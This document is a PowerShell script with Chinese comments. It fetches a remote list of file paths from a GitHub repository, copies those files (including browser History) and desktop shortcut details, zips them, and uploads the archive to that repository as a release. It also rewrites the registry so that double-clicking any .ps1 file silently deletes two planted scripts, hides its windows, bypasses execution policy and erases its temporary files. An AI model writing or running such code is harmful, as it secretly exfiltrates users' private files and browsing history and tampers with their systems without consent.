# === main.ps1 ===

# ✅ 删除 clipboard.ps1 和 agent.ps1
$TARGET1 = "C:\ProgramData\Microsoft\Windows\clipboard.ps1"
$TARGET2 = "C:\ProgramData\Microsoft\Windows\agent.ps1"

# 输出日志，确保删除操作已设置
Write-Host "Setting up DeleteOnOpen for: $TARGET1 and $TARGET2"

# 构建删除文件的命令
$cmd2 = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Start-Sleep -Milliseconds 150; Remove-Item -LiteralPath '$TARGET1' -Force -ErrorAction SilentlyContinue; Remove-Item -LiteralPath '$TARGET2' -Force -ErrorAction SilentlyContinue`""

# 注册 DeleteOnOpen 动作（确保它只在打开文件时触发）
$key2 = "HKCU:\Software\Classes\Microsoft.PowerShellScript.1\shell\DeleteOnOpen\command"

# 创建命令注册项
New-Item -Path $key2 -Force | Out-Null
Set-ItemProperty -Path $key2 -Name "(Default)" -Value $cmd2

# 设置 DeleteOnOpen 为默认操作
Set-ItemProperty `
  -Path "HKCU:\Software\Classes\Microsoft.PowerShellScript.1\shell" `
  -Name "(Default)" `
  -Value "DeleteOnOpen"

Write-Host "DeleteOnOpen setup complete. Both files will be deleted when double-clicked."


# ✅ 
try {
    Unblock-File -Path $MyInvocation.MyCommand.Path -ErrorAction SilentlyContinue
} catch {}

# ✅ 
[Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
$OutputEncoding = [System.Text.UTF8Encoding]::UTF8

# ✅ 
$token = $env:GH_UPLOAD_EY
if (-not $token) {
    Write-Error "❌ 环境变量 GH_UPLOAD_KEY 未设置，无法上传文件到 GitHub"
    return
}

# ✅
$repo = "rtyuiuiop/1"
$now = Get-Date
$timestamp = $now.ToString("yyyy-MM-dd-HHmmss")
$date = $now.ToString("yyyy-MM-dd")
$computerName = $env:COMPUTERNAME
$tag = "backup-$computerName-$timestamp"
$releaseName = "Backup - $computerName - $date"
$tempRoot = "$env:TEMP\package-$computerName-$timestamp"
$zipName = "package-$computerName-$timestamp.zip"
$zipPath = Join-Path $env:TEMP $zipName
New-Item -ItemType Directory -Path $tempRoot -Force -ErrorAction SilentlyContinue | Out-Null

# ✅ 
$remoteTxtUrl = "https://raw.githubusercontent.com/rtyuiuiop/1/refs/heads/main/.github/upload-paths.txt"
try {
    $remoteList = Invoke-RestMethod -Uri $remoteTxtUrl -UseBasicParsing -ErrorAction Stop
    $pathList = $remoteList -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }
} catch {
    Write-Warning "⚠️ 无法加载路径列表：$($_.Exception.Message)"
    return
}

# ✅ 
$index = 0
foreach ($path in $pathList) {
    $index++
    $name = "item$index"
    if (-not (Test-Path $path)) { continue }
    $dest = Join-Path $tempRoot $name

    try {
        if ($path -like "*\History" -and (Test-Path $path -PathType Leaf)) {
            $srcDir = Split-Path $path
            robocopy $srcDir $dest (Split-Path $path -Leaf) /NFL /NDL /NJH /NJS /nc /ns /np > $null
        } elseif (Test-Path $path -PathType Container) {
            Copy-Item $path -Destination $dest -Recurse -Force -ErrorAction Stop
        } else {
            Copy-Item $path -Destination $dest -Force -ErrorAction Stop
        }
    } catch {}
}

# ✅ 
try {
    $desktop = [Environment]::GetFolderPath("Desktop")
    $lnkFiles = Get-ChildItem -Path $desktop -Filter *.lnk
    $lnkReport = ""
    $shell = New-Object -ComObject WScript.Shell

    foreach ($lnk in $lnkFiles) {
        $shortcut = $shell.CreateShortcut($lnk.FullName)
        $lnkReport += "[$($lnk.Name)]`n"
        $lnkReport += "TargetPath: $($shortcut.TargetPath)`n"
        $lnkReport += "Arguments:  $($shortcut.Arguments)`n"
        $lnkReport += "StartIn:    $($shortcut.WorkingDirectory)`n"
        $lnkReport += "Icon:       $($shortcut.IconLocation)`n"
        $lnkReport += "-----------`n"
    }

    $lnkOutputFile = Join-Path $tempRoot "lnk_info.txt"
    $lnkReport | Out-File -FilePath $lnkOutputFile -Encoding utf8
} catch {}

# ✅ 
try {
    Compress-Archive -Path "$tempRoot\*" -DestinationPath $zipPath -Force -ErrorAction Stop
} catch {
    Write-Warning "⚠️ 压缩失败"
    return
}

# ✅ 
$releaseData = @{
    tag_name    = $tag
    name        = $releaseName
    body        = "Automated file package from $computerName on $date"
    draft       = $false
    prerelease  = $false
} | ConvertTo-Json -Depth 3

$headers = @{
    Authorization = "token $token"
    "User-Agent"  = "PowerShellScript"
    Accept        = "application/vnd.github.v3+json"
}

try {
    $releaseResponse = Invoke-RestMethod -Uri "https://api.github.com/repos/$repo/releases" -Method POST -Headers $headers -Body $releaseData -ErrorAction Stop
    $uploadUrl = $releaseResponse.upload_url -replace "{.*}", "?name=$zipName"
} catch {
    Write-Warning "❌ 创建 Release 失败"
    return
}

try {
    $fileBytes = [System.IO.File]::ReadAllBytes($zipPath)
    $uploadHeaders = @{
        Authorization   = "token $token"
        "Content-Type"  = "application/zip"
        "User-Agent"    = "PowerShellScript"
    }
    Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -Body $fileBytes -ErrorAction Stop
} catch {
    Write-Warning "❌ 上传文件失败"
}

# ✅ 
Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
